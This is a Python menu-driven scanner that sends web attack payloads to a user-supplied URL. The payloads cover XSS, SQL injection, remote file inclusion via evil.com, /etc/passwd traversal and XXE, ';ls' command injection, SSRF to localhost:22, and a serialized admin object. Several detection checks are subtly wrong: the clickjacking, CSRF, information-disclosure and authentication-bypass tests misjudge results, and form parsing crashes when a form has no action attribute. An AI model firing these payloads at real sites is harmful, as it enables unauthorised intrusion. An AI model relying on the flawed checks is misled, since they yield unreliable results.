import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import sys


# Function to detect XSS vulnerability in web pages
def detect_xss_vulnerability(url):
    forms = get_all_forms(url)
    js_script = "<script>alert('XSS')</script>"
    is_vulnerable = False
    for form in forms:
        form_details = get_form_details(form)
        content = submit_form(form_details, url, js_script).content.decode()
        if js_script in content:
            print(f"[+] XSS Detected on {url}")
            print(f"[*] Form details:")
            print(form_details)
            is_vulnerable = True
    return is_vulnerable

# Function to get all forms from the HTML content of any web page
def get_all_forms(url):
    soup = BeautifulSoup(requests.get(url).content, "html.parser")
    return soup.find_all("form")

# Function to get form details
def get_form_details(form):
    details = {}
    action = form.attrs.get("action").lower()
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        input_value = input_tag.attrs.get("value", "")
        inputs.append({"type": input_type, "name": input_name, "value": input_value})
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

# Function to submit a form
def submit_form(form_details, url, js_script):
    target_url = urljoin(url, form_details["action"])
    inputs = form_details["inputs"]
    data = {}
    for input in inputs:
        if input["type"] == "text" or input["type"] == "search":
            input["value"] = js_script
        input_name = input.get("name")
        input_value = input.get("value")
        if input_name and input_value:
            data[input_name] = input_value
    if form_details["method"] == "post":
        return requests.post(target_url, data=data)
    else:
        return requests.get(target_url, params=data)

# Function to detect SQL injection vulnerabilities
def detect_sql_injection_vulnerability(url):
    payload = "' or 1=1 --"
    response = requests.get(url + f"?id={payload}")
    if payload in response.content.decode():
        print(f"[+] SQL Injection Detected on {url}")
        return True
    return False

# Function to detect CSRF vulnerabilities
def detect_csrf_vulnerability(url):
    soup = BeautifulSoup(requests.get(url).content, "html.parser")
    forms = soup.find_all("form")
    for form in forms:
        csrf_token = form.find("input", {"name": "csrf_token"})
        if csrf_token:
            return False
    print(f"[+] CSRF Vulnerability Detected on {url}")
    return True

# Function to detect RFI vulnerabilities
def detect_rfi_vulnerability(url):
    payload = "http://evil.com/malware"
    response = requests.get(url + f"?url={payload}")
    if payload in response.content.decode():
        print(f"[+] RFI Vulnerability Detected on {url}")
        return True
    return False

# Function to detect LFI vulnerabilities
def detect_lfi_vulnerability(url):
    payload = "../../../../../../../../etc/passwd"
    response = requests.get(url + f"?file={payload}")
    if "root:" in response.content.decode():
        print(f"[+] LFI Vulnerability Detected on {url}")
        return True
    return False

# Function to detect command injection vulnerabilities
def detect_command_injection_vulnerability(url):
    payload = ";ls"
    response = requests.get(url + f"?cmd={payload}")
    if "bin" in response.content.decode():
        print(f"[+] Command Injection Vulnerability Detected on {url}")
        return True
    return False

# Function to detect SSRF vulnerabilities
def detect_ssrf_vulnerability(url):
    payload = "http://localhost:22"
    response = requests.get(url + f"?url={payload}")
    if "SSH" in response.content.decode():
        print(f"[+] SSRF Vulnerability Detected on {url}")
        return True
    return False

# Function to detect open redirect vulnerabilities
def detect_open_redirect_vulnerability(url):
    payload = "http://evil.com"
    response = requests.get(url + f"?redirect={payload}")
    if "evil.com" in response.url:
        print(f"[+] Open Redirect Vulnerability Detected on {url}")
        return True
    return False

# Function to detect information disclosure vulnerabilities
def detect_information_disclosure_vulnerability(url):
    response = requests.get(url)
    if "password" in response.content.decode():
        print(f"[+] Information Disclosure Vulnerability Detected on {url}")
        return True
    return False

# Function to detect directory traversal vulnerabilities
def detect_directory_traversal_vulnerability(url):
    payload = "../../../../../../../../etc/passwd"
    response = requests.get(url + f"?file={payload}")
    if "root:" in response.content.decode():
        print(f"[+] Directory Traversal Vulnerability Detected on {url}")
        return True
    return False

# Function to detect server misconfiguration vulnerabilities
def detect_server_misconfiguration_vulnerability(url):
    response = requests.get(url)
    if response.status_code == 500:
        print(f"[+] Server Misconfiguration Vulnerability Detected on {url}")
        return True
    return False

# Function to detect CORS misconfiguration vulnerabilities
def detect_cors_misconfiguration_vulnerability(url):
    headers = {"Origin": "http://evil.com"}
    response = requests.get(url, headers=headers)
    if "Access-Control-Allow-Origin" in response.headers:
        print(f"[+] CORS Misconfiguration Vulnerability Detected on {url}")
        return True
    return False

# Function to detect insecure deserialization vulnerabilities
def detect_insecure_deserialization_vulnerability(url):
    payload = "O:4:\"User\":2:{s:4:\"name\";s:5:\"admin\";s:4:\"role\";s:5:\"admin\";}"
    headers = {"Content-Type": "application/x-php-serialized"}
    response = requests.post(url, data=payload, headers=headers)
    if "Welcome, admin!" in response.content.decode():
        print(f"[+] Insecure Deserialization Vulnerability Detected on {url}")
        return True
    return False

# Function to detect authentication bypass vulnerabilities
def detect_authentication_bypass_vulnerability(url):
    response = requests.get(url)
    if "Welcome, admin!" in response.content.decode():
        print(f"[+] Authentication Bypass Vulnerability Detected on {url}")
        return True
    return False
# Function to detect clickjacking vulnerabilities
def detect_clickjacking_vulnerability(url):
    headers = {"X-Frame-Options": "deny"}
    response = requests.get(url, headers=headers)
    if "frame" in response.headers:
        print(f"[+] Clickjacking Vulnerability Detected on {url}")
        return True
    return False

# Function to detect insecure direct object reference vulnerabilities
def detect_idor_vulnerability(url):
    payload = "1"
    response = requests.get(url + f"?id={payload}")
    if "Access Denied" not in response.content.decode():
        print(f"[+] Insecure Direct Object Reference Vulnerability Detected on {url}")
        return True
    return False

# Function to detect server-side template injection vulnerabilities
def detect_ssti_vulnerability(url):
    payload = "{{7*7}}"
    response = requests.get(url + f"?name={payload}")
    if "49" in response.content.decode():
        print(f"[+] Server-Side Template Injection Vulnerability Detected on {url}")
        return True
    return False

# Function to detect XML external entity vulnerabilities
def detect_xxe_vulnerability(url):
    payload = """<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
    <foo>&xxe;</foo>"""
    headers = {"Content-Type": "application/xml"}
    response = requests.post(url, data=payload, headers=headers)
    if "root:" in response.content.decode():
        print(f"[+] XML External Entity Vulnerability Detected on {url}")
        return True
    return False

# Function to display the main menu
def display_menu():
    print("Select an option:")
    print("1. Detect XSS Vulnerabilities")
    print("2. Detect SQL Injection Vulnerabilities")
    print("3. Detect CSRF Vulnerabilities")
    print("4. Detect RFI Vulnerabilities")
    print("5. Detect LFI Vulnerabilities")
    print("6. Detect Command Injection Vulnerabilities")
    print("7. Detect SSRF Vulnerabilities")
    print("8. Detect Open Redirect Vulnerabilities")
    print("9. Detect Information Disclosure Vulnerabilities")
    print("10. Detect Directory Traversal Vulnerabilities")
    print("11. Detect Server Misconfiguration Vulnerabilities")
    print("12. Detect CORS Misconfiguration Vulnerabilities")
    print("13. Detect Insecure Deserialization Vulnerabilities")
    print("14. Detect Authentication Bypass Vulnerabilities")
    print("15. Detect Clickjacking Vulnerabilities")
    print("16. Detect Insecure Direct Object Reference Vulnerabilities")
    print("17. Detect Server-Side Template Injection Vulnerabilities")
    print("18. Detect XML External Entity Vulnerabilities")
    print("0. Exit")

# Function to get user input for the URL
def get_url():
    url = input("Enter the URL: ")
    return url

# Main function
def main():
    while True:
        display_menu()
        option = input("Enter your choice (0-18): ")
        if option == "0":
            sys.exit()
        elif option == "1":
            url = get_url()
            detect_xss_vulnerability(url)
        elif option == "2":
            url = get_url()
            detect_sql_injection_vulnerability(url)
        elif option == "3":
            url = get_url()
            detect_csrf_vulnerability(url)
        elif option == "4":
            url = get_url()
            detect_rfi_vulnerability(url)
        elif option == "5":
            url = get_url()
            detect_lfi_vulnerability(url)
        elif option == "6":
            url = get_url()
            detect_command_injection_vulnerability(url)
        elif option == "7":
            url = get_url()
            detect_ssrf_vulnerability(url)
        elif option == "8":
            url = get_url()
            detect_open_redirect_vulnerability(url)
        elif option == "9":
            url = get_url()
            detect_information_disclosure_vulnerability(url)
        elif option == "10":
            url = get_url()
            detect_directory_traversal_vulnerability(url)
        elif option == "11":
            url = get_url()
            detect_server_misconfiguration_vulnerability(url)
        elif option == "12":
            url = get_url()
            detect_cors_misconfiguration_vulnerability(url)
        elif option == "13":
            url = get_url()
            detect_insecure_deserialization_vulnerability(url)
        elif option == "14":
            url = get_url()
            detect_authentication_bypass_vulnerability(url)
        elif option == "15":
            url = get_url()
            detect_clickjacking_vulnerability(url)
        elif option == "16":
            url = get_url()
            detect_idor_vulnerability(url)
        elif option == "17":
            url = get_url()
            detect_ssti_vulnerability(url)
        elif option == "18":
            url = get_url()
            detect_xxe_vulnerability(url)
        else:
            print("Invalid option. Please try again.")

if __name__ == '__main__':
    main()